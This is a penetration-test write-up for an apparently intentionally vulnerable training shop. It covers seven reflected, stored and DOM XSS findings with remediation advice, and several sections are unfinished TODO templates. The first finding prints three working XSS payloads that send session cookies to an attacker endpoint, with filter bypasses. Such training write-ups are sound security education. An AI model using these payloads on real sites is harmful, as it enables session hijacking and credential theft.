# NexusShop XSS Vulnerability Assessment — Penetration Test Report

## Executive Summary

**Target:** http://web0x0c.hbtn
**Assessment Date:** August 28, 2026
**Scope:** Cross-Site Scripting (XSS) assessment of the NexusShop e-commerce platform, covering the search function, product sorting, product reviews, user profiles, the admin Markdown product editor, product-page URL fragment handling, and the cart's `postMessage` handler.

A penetration test was performed on the NexusShop application. **7 critical XSS vulnerabilities** were identified spanning Reflected, Stored, and DOM-based attack vectors. All flags were successfully captured across all 7 findings. The assessment demonstrates that improper output encoding, incomplete sanitizer configuration, unsafe `innerHTML` usage, and unvalidated `postMessage` handling collectively allow an attacker to hijack sessions, harvest credentials, and persist malicious code that executes automatically for any user who visits an affected page.

### Flags Captured

| Task | Flag | Vulnerability |
|------|------|---------------|
| 0 | `FLAG{9ecece26496c2f4155871b16f81a18d3}` | Reflected XSS - Basic Search |
| 1 | `FLAG{198b670eb1d484bc5f5bb5a55610f414}` | Reflected XSS - JavaScript Context |
| 2 | `FLAG{2066736f76469a601717fd33644f9b00}` | Stored XSS - Product Reviews |
| 3 | `FLAG{a5c406ea6f1de3b71003dfb7c8520b82}` | Stored XSS - User Profile |
| 4 | `FLAG{0a0c749774ac1c85c7827e221d8ef5eb}` | Stored XSS - Markdown Editor |
| 5 | `FLAG{eb8737a381af18dc4bcbc69bffe94574}` | DOM XSS - URL Hash Hijack |
| 6 | `FLAG{cd97dc80d1dcfe7001cc4cf1c241836d}` | DOM XSS - postMessage Abuse |

---

## Detailed Vulnerability Findings

## Task 0: Reflected XSS - Basic Search

### Vulnerability Description

The `/search` endpoint and its filtered/advanced variants reflect the `q` parameter directly into the page heading without output encoding. The developers assumed that echoing the user's search term back to them was cosmetic and harmless, but because the reflected value is inserted as raw HTML rather than escaped text, any HTML or script content submitted in the parameter is parsed and executed by the browser. The application layers on basic keyword/attribute filtering at Stage 2 and Stage 3, but these filters block specific tags and event handlers rather than validating or encoding output — a blocklist approach that is trivially bypassed once you know the browser's broader event surface.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/search?q=`, `/search/filtered?q=`, `/search/advanced?q=` |
| **Parameter/Field** | `q` |
| **Type** | Reflected XSS |
| **Severity** | Critical |

### Attack Vector

1. Submitted `TESTINPUT123` in the `q` parameter and confirmed it was reflected unescaped in the page heading (viewed page source to confirm it rendered as live HTML, not encoded text).
2. **Stage 1** (`/search?q=`, no filtering): injected a `<script>` tag directly, since no tags were blocked at this stage.
3. **Stage 2** (`/search/filtered?q=`, `<script>` blocked): pivoted to an `<img src=x onerror=...>` payload — an invalid image source reliably fires the `onerror` event without needing a `<script>` tag.
4. **Stage 3** (`/search/advanced?q=`, common event handlers blocked): pivoted again to an SVG `<animate>` element using the `onbegin` event, which isn't on the typical blocked-handler list.
5. Each payload waited 500ms (`DELAY_TOKEN`) for the page's `tracking-id` element to populate, exfiltrated `document.cookie` to `/attacker/api/exfil`, then submitted the stage token to `/search/api/track` to retrieve the flag.
6. Verified via DevTools → Network that both the `/attacker/api/exfil` and `/search/api/track` calls fired, and confirmed the exfiltrated cookie data appeared on the `/attacker` C2 dashboard.

### Payload Used

**Stage 1:**
```html
<script>setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:1})});fetch("/search/api/track?t="+t)},500)</script>
```

**Stage 2:**
```html
<img src=x onerror='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:2})});fetch("/search/api/track?t="+t)},500)'>
```

**Stage 3:**
```html
<svg><animate attributeName=x dur=1s onbegin='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:3})});fetch("/search/api/track?t="+t).then(r=>r.json()).then(d=>console.log(d))},500)'></animate></svg>
```

### Evidence

DevTools verification across three panels confirmed full exploitation:

- **Console** — Stage 1 payload executed via `setTimeout`, targeting `document.getElementById("tracking-id")`, exfiltrating `document.cookie` to `/attacker/api/exfil`.

  ![Console showing executed payload](screenshots/task0-01-console-payload.png)

- **Network** — two calls fired as expected: a `POST` to `exfil` (200, JSON response) and a `GET` to `track?t=...` (200, response `{"status": "tracked"}`).

  ![Network tab showing exfil and track requests](screenshots/task0-02-network-response.png)

- **Stage 3 response (advanced search)** — the tracking response returned the flag directly in its JSON body: `{"ref": "FLAG{9ecece26496c2f4155871b16f81a18d3}", "status": "tracked"}`, confirmed against the page rendering `Advanced search: TESTINPUT` with the reflected query unescaped in the heading.

  ![Tracking response containing the flag](screenshots/task0-03-flag-response.png)

### Real-World Impact

A reflected XSS in a public search bar is one of the most effective phishing primitives in real-world attacks. An attacker crafts a link on the legitimate `web0x0c.hbtn` domain embedding the payload in the `q` parameter and distributes it via email or social media. Because the URL's domain looks trustworthy, victims are far more likely to click than they would a fake login page. On click, the payload executes silently in the victim's authenticated session, exfiltrating session cookies to the attacker's server — enabling full session hijacking without ever needing the victim's password. The same mechanism could just as easily capture keystrokes or inject a fake login form to harvest credentials.

### Remediation

- **HTML-encode all reflected user input** before inserting it into the page — e.g., in a templating engine, use the auto-escaping output (`{{ q }}` in most modern template engines, or explicitly `{{ q | e }}` in Jinja2) instead of raw string concatenation or `.innerHTML`.
- **Reject blocklist-based filtering** (blocking `<script>`, then a handful of event handlers) in favor of a strict output-encoding or allowlist approach — blocklists will always miss some vector, as Stage 2 and Stage 3 demonstrate.
- **Deploy a Content-Security-Policy** (e.g., `script-src 'self'`) to prevent inline `<script>` and inline event handlers from executing even if injection occurs.
- **Set cookies as `HttpOnly`** so `document.cookie` can't be read by injected JavaScript, limiting the blast radius of any XSS that does slip through.

---

## Task 1: Reflected XSS - JavaScript Context

### Vulnerability Description

Unlike Task 0's HTML-context reflection, the `by` parameter on `/products/sort` is inserted directly into an inline `<script>` block as a JavaScript string literal. Because the value lands inside existing JavaScript rather than the HTML body, encoding HTML metacharacters (`<`, `>`) is irrelevant — the vulnerability is a string-breakout issue, not an HTML-injection issue. An attacker who can close the surrounding quote can terminate the intended string, inject arbitrary statements, and comment out the trailing original syntax to keep the script valid.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/products/sort?by=`, `/products/sort/dynamic?by=`, `/products/sort/advanced?by=` |
| **Parameter/Field** | `by` |
| **Type** | Reflected XSS (JavaScript-context breakout) |
| **Severity** | Critical |

### Attack Vector

1. Submitted `TESTINPUT123` in `by` and located it inside an inline `<script>` block via View Source, identifying the surrounding quote delimiter.
2. **Stage 1** (no JS filter): closed the string, injected a statement, and commented out the trailing original code (`'; ...; //` pattern).
3. **Stage 2** (quotes stripped): _[TODO — describe how you escaped the quote-stripping filter]_
4. **Stage 3** (strict filter): _[TODO — describe how you closed `</script>` and started fresh, per the brief's hint]_
5. Confirmed no syntax errors in Console, then submitted the tracking token via `/products/sort/api/track`.

### Payload Used

**Stage 1:** `[TODO — insert your exact Stage 1 payload string]`
**Stage 2:** `[TODO — insert your exact Stage 2 payload string]`
**Stage 3:** `[TODO — insert your exact Stage 3 payload string]`

### Evidence

_[TODO — describe what the C2 dashboard / tracking response showed]_

### Real-World Impact

This class of bug is dangerous precisely because it bypasses standard HTML-encoding defenses — a developer who dutifully escapes `<` and `>` for HTML output can still ship a JS-context injection if the same value is echoed into an inline script. An attacker exploiting this could execute arbitrary JavaScript in the context of any user who follows a crafted sort-order link, leading to session hijacking or credential theft identical in impact to Task 0.

### Remediation

- Never interpolate user input directly into inline `<script>` blocks. Pass data to JavaScript via a `data-*` attribute or a JSON blob read with `JSON.parse`, not string concatenation into source code.
- If inline interpolation is unavoidable, use a JS-string-safe encoder (e.g., `JSON.stringify()` around the value) rather than HTML encoding, and validate that the encoder escapes quotes, backslashes, and `</script>` sequences.
- Apply CSP with a nonce-based `script-src` so unauthorized inline scripts cannot execute even if breakout occurs.

---

## Task 2: Stored XSS - Product Reviews

### Vulnerability Description

The product review system at `/product/1/reviews` accepts and persists HTML/JavaScript in review-related fields without adequate sanitization, and renders that stored content to every subsequent visitor of the product page. Unlike reflected XSS, this requires no victim interaction with a crafted link — the payload executes automatically for anyone who simply views the page, making the potential blast radius far larger.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/product/1/reviews`, `/product/1/reviews/verified`, `/product/1/reviews/all` |
| **Parameter/Field** | Review body; Stage 3 — `[TODO — insert the actual hidden field you found, e.g. reviewer name/title]` |
| **Type** | Stored XSS |
| **Severity** | Critical |

### Attack Vector

1. Submitted a normal review to confirm rendering behavior on the page.
2. **Stage 1**: injected `[TODO]` into the review body; confirmed persistence across a page reload.
3. **Stage 2** (`<script>` filtered): pivoted to `[TODO — the non-script element/handler used]`.
4. **Stage 3**: identified that `[TODO — which non-obvious form field]` was the actual unsanitized field, and injected there.
5. Verified via C2 dashboard that the payload fired on a fresh, unauthenticated page load — i.e., without resubmitting anything — confirming the stored/persistent nature of the exploit.

### Payload Used

**Stage 1:** `[TODO]`
**Stage 2:** `[TODO]`
**Stage 3:** `[TODO]`

### Evidence

_[TODO — describe what the C2 dashboard showed on reload, ideally noting it fired automatically]_

### Real-World Impact

A stored XSS in product reviews is one of the most severe web vulnerabilities in practice: it requires the attacker to act only once, after which every visitor to that product page — potentially thousands of customers on a popular listing — has their session silently compromised. This could be used to log payment-form keystrokes, harvest session cookies at scale, or inject a fraudulent login overlay on a page the user trusts. The attack persists until the malicious review is found and removed from the database.

### Remediation

- Sanitize all user-submitted review content server-side before storage, using an allowlist-based HTML sanitizer (e.g., DOMPurify server-side, or a library like `bleach`) rather than a denylist of tags.
- Sanitize (or better, encode) every field in the review form, not just the primary body — the Stage 3 finding shows that partial coverage leaves other fields exploitable.
- Apply output encoding at render time as defense-in-depth, even if input was sanitized at submission time.

---

## Task 3: Stored XSS - User Profile

### Vulnerability Description

The `/profile` page fetches profile data from a JSON API and renders it client-side using `innerHTML` rather than `textContent`. While the JSON payload itself is transported safely, the frontend's use of `innerHTML` means any HTML stored in profile fields (such as `bio`) is parsed and executed by the browser at render time. This is a classic DOM-based/stored hybrid: the stored payload lives server-side, but the vulnerability is purely a client-side rendering choice.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/profile`, `/profile/settings`, `/profile/edit` |
| **Parameter/Field** | `bio`; Stage 3 — `[TODO — insert the actual hidden field]` |
| **Type** | Stored XSS (DOM sink via `innerHTML`) |
| **Severity** | Critical |

### Attack Vector

1. Located the profile API call in the Network tab and confirmed the frontend inserts `data.bio` via `innerHTML` (visible in Sources/Elements).
2. **Stage 1**: injected `[TODO]` into `bio`, saved, reloaded, and confirmed the API response carried the raw payload while the browser executed it.
3. **Stage 2** (`<script>` filtered): used `[TODO — non-script vector]`.
4. **Stage 3**: found that `[TODO — the actual hidden vulnerable field]` was rendered the same unsafe way and injected there.
5. Used the delayed-token (`setTimeout`) pattern since async rendering meant `tracking-id` wasn't immediately present.

### Payload Used

**Stage 1:** `[TODO]`
**Stage 2:** `[TODO]`
**Stage 3:** `[TODO]`

### Evidence

_[TODO — describe what Network/Elements/C2 showed]_

### Real-World Impact

Because the malicious payload is stored via a legitimate profile-update flow and then rendered via an unsafe DOM sink, any user who views that profile — not just the profile owner — is compromised the moment the page loads. This is particularly dangerous on platforms with public or semi-public profiles (e.g., seller profiles, forum users), where a single poisoned profile can silently compromise every visitor.

### Remediation

- Replace `innerHTML` assignments of user-controlled data with `textContent`, or route rich-text fields through a client-side sanitizer (e.g., DOMPurify) before insertion.
- Treat "JSON is safe" as a transport-layer statement only — sanitization must happen at the point of DOM insertion, not assumed from the data format.
- Audit all profile fields for consistent rendering treatment; Stage 3 demonstrates that inconsistent sanitization across fields reopens the vulnerability.

---

## Task 4: Stored XSS - Markdown Editor

### Vulnerability Description

The admin product-description editor converts Markdown to HTML for rendering on public product pages. The Markdown-to-HTML sanitizer is incompletely configured across the three stages, permitting either raw HTML passthrough or unsafe URL schemes (e.g., `javascript:` links) to survive conversion. Because this content is authored by an admin but rendered to every customer viewing the product, a compromised or careless admin account becomes a mass-XSS vector against the storefront's entire customer base.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/admin/products/1/edit`, `/admin/products/1/edit/safe`, `/admin/products/1/edit/strict` |
| **Parameter/Field** | Product description (Markdown body) |
| **Type** | Stored XSS (sanitizer bypass) |
| **Severity** | Critical |

### Attack Vector

1. Wrote a normal Markdown description and confirmed it rendered correctly in preview.
2. **Stage 1** (raw HTML allowed): embedded `[TODO — your raw HTML payload]` directly, confirming it survived unmodified into the rendered preview.
3. **Stage 2** (sanitizer strips some tags): tested systematically which tags/attributes survived; used `[TODO — the surviving vector]`.
4. **Stage 3** (stricter sanitizer): compared typed Markdown vs. rendered Elements output and found `[TODO — the specific sanitizer gap, e.g. javascript: URI in a Markdown link, or a normalization quirk]`.
5. Confirmed the C2 fired from the rendered product preview page, not the editor itself, confirming the exploit affects end-customers.

### Payload Used

**Stage 1:** `[TODO]`
**Stage 2:** `[TODO]`
**Stage 3:** `[TODO]`

### Evidence

_[TODO — describe what the rendered product preview + C2 showed]_

### Real-World Impact

Markdown sanitizer bypasses are a well-documented real-world vulnerability class (seen in various CMS and forum products). Because the payload is authored through a trusted admin workflow and rendered to every visitor of a product page, this represents one of the highest-impact vectors in the assessment — a single malicious or compromised admin session can silently compromise the entire customer base browsing that product, with no further action needed from the attacker.

### Remediation

- Use a well-maintained, actively patched Markdown sanitizer (e.g., `markdown-it` with `DOMPurify` post-processing) rather than a custom or partially configured denylist.
- Explicitly strip or allowlist URL schemes in Markdown links/images — reject `javascript:` and `data:` URIs outright; only allow `http(s):` and relative paths.
- Re-sanitize on render, not just on save, so that sanitizer upgrades apply retroactively to previously stored content.
- Apply the principle of least privilege to admin accounts and require MFA, since this vector turns any admin compromise into a customer-facing mass XSS.

---

## Task 5: DOM XSS - URL Hash Hijack

### Vulnerability Description

Client-side JavaScript on the product page reads `location.hash` — the fragment portion of the URL after `#` — and writes it into the DOM via `innerHTML`. Because the fragment is never transmitted to the server (it's purely a client-side browser construct), this vulnerability is entirely invisible to server-side logging, WAFs, and any server-side input filtering. The source (`location.hash`) and sink (`innerHTML`) are both client-side, making this a pure DOM-based XSS rather than reflected or stored.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/product/1#`, `/product/1/gallery#`, `/product/1/specs#` |
| **Parameter/Field** | URL fragment (`location.hash`) |
| **Type** | DOM-based XSS |
| **Severity** | Critical |

### Attack Vector

1. Appended `#TESTINPUT123` to the product URL and confirmed the page content updated without any network request firing — verifying the value never reached the server.
2. Used DevTools → Sources to locate the function reading `location.hash`, set a breakpoint, and traced the value through to its `innerHTML` sink.
3. **Stage 1** (direct `innerHTML` sink, no filtering): since `<script>` tags inserted via `innerHTML` don't execute in modern browsers, used `[TODO — your element/event-based payload, e.g. img onerror]`.
4. **Stage 2** (script removal filter): confirmed plain `<script>` tags were stripped but event attributes still functioned; used `[TODO]`.
5. **Stage 3** (event handler attribute filter): common handlers (`onerror`, `onload`, etc.) were filtered; pivoted to `[TODO — the alternative execution path found]`.
6. Confirmed via Network tab that no request carried the payload at any stage, and via C2 dashboard that the exfil still fired purely client-side.

### Payload Used

**Stage 1:** `[TODO]`
**Stage 2:** `[TODO]`
**Stage 3:** `[TODO]`

### Evidence

_[TODO — describe what the C2 dashboard showed; note explicitly that the Network tab showed no outbound request carrying the payload]_

### Real-World Impact

DOM XSS via URL fragments is especially dangerous in production because it bypasses every server-side defense — WAFs, log monitoring, and input validation are all blind to it, since the payload never leaves the browser until exfiltration. An attacker can distribute a link like `web0x0c.hbtn/product/1/specs#<payload>` and the target site's own security monitoring will show nothing unusual in server logs, delaying detection significantly compared to reflected or stored XSS.

### Remediation

- Never write `location.hash` (or any client-side-only source: `location.search`, `document.referrer`, `window.name`) into the DOM via `innerHTML`. Use `textContent` or a templating library with auto-escaping.
- If HTML rendering from the hash is a genuine product requirement, sanitize with a robust client-side library (e.g., DOMPurify) before insertion — never rely on a denylist of tags or event attributes, since the attack surface of HTML event handlers is far larger than any denylist can cover, as Stages 1–3 demonstrate.
- Apply CSP (`script-src`, and disallow inline event handlers) as a defense-in-depth layer, since it blocks execution even if a DOM sink exists.
- Include DOM XSS sinks (`innerHTML`, `outerHTML`, `document.write`, etc.) in static analysis / SAST tooling, since these are structurally invisible to server-side security monitoring.

---

## Task 6: DOM XSS - postMessage Abuse

### Vulnerability Description

The cart page (`/cart`) implements a `message` event listener that renders attacker-controllable data from `window.postMessage` calls into the DOM, without validating the sender's origin or the shape/content of the message payload. `postMessage` is a legitimate cross-window/cross-iframe communication API, but when the receiving handler trusts message content unconditionally and inserts it via an unsafe DOM sink, any page (or script running in the browser Console) can inject arbitrary HTML into the victim's rendered page — no server round-trip required, and no origin check to stop a malicious sender.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **URL** | `/cart`, `/cart/checkout`, `/cart/payment` |
| **Parameter/Field** | `postMessage` payload — `content` and/or `html` fields |
| **Type** | DOM-based XSS (unsafe `postMessage` handler) |
| **Severity** | Critical |

### Attack Vector

1. Loaded `/cart`, opened Console, and sent the safe test message `window.postMessage({ content: 'TESTINPUT123' }, '*')`, confirming the Special Offers widget updated.
2. Opened Sources, searched for `addEventListener('message'`, and read the handler to identify the trusted field(s) and the DOM sink it writes to.
3. **Stage 1** (`/cart`, message rendered directly, no filter): sent `[TODO — your exact postMessage call/object]` to trigger execution.
4. **Stage 2** (`/cart/checkout`, `<script>` filtered): confirmed `<script>` tags were stripped but other HTML still rendered; sent `[TODO]`.
5. **Stage 3** (`/cart/payment`, strict object shape + common handlers filtered): determined the handler expected `[TODO — the specific shape found, e.g. {type: 'widget-update', content: ...}]` and that standard event handlers were filtered; used `[TODO — the alternative handler/field found]`.
6. Confirmed C2 evidence and submitted the stage token to `/cart/api/track`.

### Payload Used

**Stage 1:** `[TODO]`
**Stage 2:** `[TODO]`
**Stage 3:** `[TODO]`

### Evidence

_[TODO — describe what the C2 dashboard and Special Offers widget showed at each stage]_

### Real-World Impact

Because `postMessage` communication happens entirely client-side, this vulnerability shares DOM XSS's server-blindness problem (as in Task 5) — but is arguably worse in a real cross-origin scenario: any malicious page the victim has open in another tab or iframe could silently send crafted messages to a trusted origin like the cart page, with no user interaction beyond having both pages open. On a checkout/payment flow specifically, this could be used to inject a fraudulent payment form or capture entered card details, directly on a page the user trusts because the URL itself is legitimate.

### Remediation

- **Always validate `event.origin`** in the message handler against an explicit allowlist of trusted origins before processing any message content — this is the single most important fix, since it closes the vulnerability regardless of payload content.
- **Validate message shape strictly** — reject anything that doesn't match an exact expected schema, rather than trusting whichever field happens to be present.
- **Never render message content via `innerHTML`.** Use `textContent`, or if HTML rendering is required, sanitize with DOMPurify after origin/shape validation.
- Apply CSP as defense-in-depth to limit the damage of any successful injection.

---

## Remediation Summary

| Priority | Recommendation |
|----------|-----------------|
| Critical | Replace all `innerHTML` assignments of user- or API-derived data with `textContent`, or sanitize with a maintained allowlist library (e.g. DOMPurify) before insertion. |
| Critical | Encode/escape all reflected and stored user input at the point of output, using context-aware encoding — HTML encoding for HTML context, JS-string encoding (e.g. `JSON.stringify`) for inline-script context. |
| Critical | Validate `event.origin` and strict message schema on every `postMessage` listener. |
| High | Replace blocklist-based tag/attribute filtering (across search, reviews, hash-rendering, and postMessage handlers) with allowlist-based sanitization — blocklists were bypassed in every multi-stage task in this assessment. |
| High | Configure the Markdown sanitizer to strip `javascript:`/`data:` URI schemes and re-sanitize on render, not only on save. |
| High | Deploy a strict Content-Security-Policy (`script-src 'self'`, no inline event handlers, nonce-based inline scripts) as defense-in-depth across the application. |
| Medium | Set all session cookies as `HttpOnly` to limit the impact of any XSS that evades the above controls. |
| Medium | Add DOM XSS sinks (`innerHTML`, `outerHTML`, `document.write`) and `postMessage` handlers to SAST/static-analysis tooling, since these are invisible to server-side log monitoring. |
| Medium | Sanitize every field in multi-field forms (reviews, profile, admin editor) consistently — several findings in this assessment stemmed from partial coverage that left secondary fields exploitable. |

## Conclusion

This assessment identified 7 critical XSS vulnerabilities across NexusShop's reflected, stored, and DOM-based attack surfaces, and all associated flags were successfully captured, confirming exploitability at every stage tested. The findings collectively demonstrate a systemic pattern rather than isolated bugs: output is repeatedly trusted and rendered unsafely (via raw HTML reflection, `innerHTML` sinks, or unvalidated `postMessage` handlers), and where filtering exists, it consistently takes a blocklist approach that was bypassed using alternate HTML elements, event handlers, or JavaScript-context breakout techniques.

NexusShop is an intentionally vulnerable training environment built for the Holberton Cybersecurity Academy's web application security curriculum; the vulnerabilities documented here were deliberately introduced for educational purposes and do not reflect a production system.

**Lessons learned:** the recurring theme across all 7 findings is that defenses aimed at specific payloads (denylisted tags, stripped quotes, filtered event handlers) are reliably bypassable, while defenses aimed at the underlying mechanism (context-aware output encoding, safe DOM APIs, origin validation, allowlist sanitization) close entire vulnerability classes at once. Prioritizing the latter over the former is the single highest-leverage change NexusShop's engineering team could make.
